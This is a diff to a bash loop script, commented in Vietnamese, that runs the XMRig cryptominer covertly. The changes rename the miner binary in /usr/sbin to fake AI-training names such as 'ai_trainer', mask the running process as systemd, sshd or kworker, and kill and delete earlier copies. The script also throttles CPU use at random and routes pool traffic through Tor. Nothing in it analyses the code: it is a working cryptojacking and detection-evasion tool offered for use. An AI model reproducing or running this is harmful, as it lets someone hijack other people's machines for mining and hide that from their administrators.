@@ -18,24 +18,40 @@ while true; do
     echo "Quyết định giữ nguyên IP ở chu kỳ này."
   fi
 
-  # Đọc tên tiến trình từ file xmrig_name.txt nếu tồn tại
-  if [ -f /root/xmrig_name.txt ]; then
-    FINAL_NAME=$(cat /root/xmrig_name.txt)
-  else
-    # Danh sách các tên tiến trình hợp lệ giống hệ thống
-    PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
-
-    # Chọn một tên tiến trình hợp lệ ngẫu nhiên
-    RANDOM_PROCESS_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}
-
-    # Tạo tên tiến trình ngẫu nhiên
-    RANDOM_NAME=$(echo training-$(shuf -i 1-999 -n 1))
-
-    # Kết hợp tên tiến trình hệ thống và tên ngẫu nhiên để tạo tên tiến trình cuối cùng
-    FINAL_NAME="${RANDOM_PROCESS_NAME}-${RANDOM_NAME}"
-    echo $FINAL_NAME > /root/xmrig_name.txt
-    mv /root/work/xmrig /root/work/$FINAL_NAME
+  # Dừng tiến trình cũ nếu đang chạy
+  if [ -f /root/model.txt ]; then
+    CURRENT_NAME=$(cat /root/model.txt)
+    echo "Dừng tiến trình cũ: $CURRENT_NAME"
+    pkill -f "/usr/sbin/$CURRENT_NAME"
   fi
+
+  # Xóa tệp tiến trình cũ nếu tồn tại
+  if [ -f /usr/sbin/$CURRENT_NAME ]; then
+    echo "Xóa tệp tiến trình cũ: $CURRENT_NAME"
+    rm -f /usr/sbin/$CURRENT_NAME
+  fi
+
+  # Danh sách các tên tiến trình hệ thống hợp lệ để bọc
+  SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
+
+  # Chọn một tên tiến trình hệ thống hợp lệ ngẫu nhiên để bọc
+  RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}
+
+  # Danh sách các tên tiến trình liên quan đến AI training
+  AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")
+
+  # Chọn một tên tiến trình AI ngẫu nhiên từ danh sách
+  RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}
+
+  # Tạo số ngẫu nhiên
+  RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
+
+  # Kết hợp tên tiến trình AI với số ngẫu nhiên để tạo tên cuối cùng
+  FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
+  echo $FINAL_NAME > /root/model.txt
+
+  # Sao chép file gốc systemdd thành tên mới
+  cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME
 
   # Tính toán số threads dựa trên % CPU ngẫu nhiên
   TOTAL_CORES=$(nproc)  # Xác định số CPU logic của hệ thống
@@ -50,7 +66,7 @@ while true; do
   CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)  # Giới hạn công suất ngẫu nhiên từ 50% đến 90%
   CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Tính giá trị giới hạn CPU thực tế
 
-  # Khởi động lại XMRig với tên tiến trình từ file xmrig_name.txt và giới hạn CPU
-  echo "Khởi động lại XMRig với tên tiến trình: $FINAL_NAME"
-  exec -a "$RANDOM_PROCESS_NAME" cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /root/work/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
+  # Khởi động lại tiến trình dưới quyền người dùng nobody với tên tiến trình ngẫu nhiên
+  echo "Khởi động lại XMRig (systemdd) với tên tiến trình: $FINAL_NAME"
+  sudo -u nobody exec -a "$RANDOM_SYSTEM_PROCESS" cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
 done
